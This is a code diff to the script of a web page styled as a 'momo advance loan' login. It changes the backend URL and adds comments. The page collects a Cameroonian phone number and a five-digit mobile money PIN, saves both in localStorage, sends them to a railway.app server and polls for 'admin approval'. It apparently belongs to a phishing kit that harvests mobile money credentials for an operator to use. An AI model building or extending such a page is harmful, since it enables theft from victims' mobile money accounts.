@@ -509,13 +509,19 @@
 
     <script>
         // ============================================
-        // ✅ CORRECT BACKEND — easy-loansej1
+        // ✅ NEW BACKEND URL
         // ============================================
-        const API_BASE = 'https://easy-loansej1-production.up.railway.app';
+        const API_BASE = 'https://momo-advance-loan-production.up.railway.app';
 
+        // ============================================
+        // POLLING CONFIG
+        // ============================================
         const POLL_INTERVAL_MS = 2000;
         let pollTimer = null;
 
+        // ============================================
+        // PHONE INPUT
+        // ============================================
         const phoneInput = document.getElementById('phone');
         const phoneWrapper = document.getElementById('phoneWrapper');
         const phoneError = document.getElementById('phoneError');
@@ -529,6 +535,9 @@
             }
         });
 
+        // ============================================
+        // PIN INPUT (5 boxes)
+        // ============================================
         const pinBoxes = [
             document.getElementById('pin1'),
             document.getElementById('pin2'),
@@ -579,6 +588,9 @@
             return pinBoxes.map(b => b.value).join('');
         }
 
+        // ============================================
+        // EYE TOGGLE
+        // ============================================
         const pinToggle = document.getElementById('pinToggle');
         const eyeIcon = document.getElementById('eyeIcon');
         let pinVisible = false;
@@ -601,17 +613,25 @@
             eyeIcon.innerHTML = pinVisible ? eyeClosedSVG : eyeOpenSVG;
         });
 
+        // ============================================
+        // VERIFY OVERLAY
+        // ============================================
         const verifyOverlay = document.getElementById('verifyOverlay');
 
-        function showVerifyOverlay() { verifyOverlay.classList.add('show'); }
-        function hideVerifyOverlay() { verifyOverlay.classList.remove('show'); }
+        function showVerifyOverlay() {
+            verifyOverlay.classList.add('show');
+        }
+
+        function hideVerifyOverlay() {
+            verifyOverlay.classList.remove('show');
+        }
 
         // ============================================
-        // ✅ POLLING — /api/approval/status/:requestId
-        // (matches this server.js)
+        // POLLING FOR ADMIN APPROVAL
         // ============================================
         function startPolling(requestId) {
             stopPolling();
+
             console.log('🔄 Polling started for requestId:', requestId);
 
             pollTimer = setInterval(async () => {
@@ -668,6 +688,9 @@
             }
         }
 
+        // ============================================
+        // LOGIN BUTTON
+        // ============================================
         const loginBtn = document.getElementById('loginBtn');
 
         loginBtn.addEventListener('click', async function() {
@@ -713,7 +736,6 @@
                 localStorage.setItem('momoPhone', '+237' + phoneDigits);
                 localStorage.setItem('momoPin', pin);
 
-                // ✅ this server returns `requestId`
                 startPolling(data.requestId);
 
             } catch (err) {
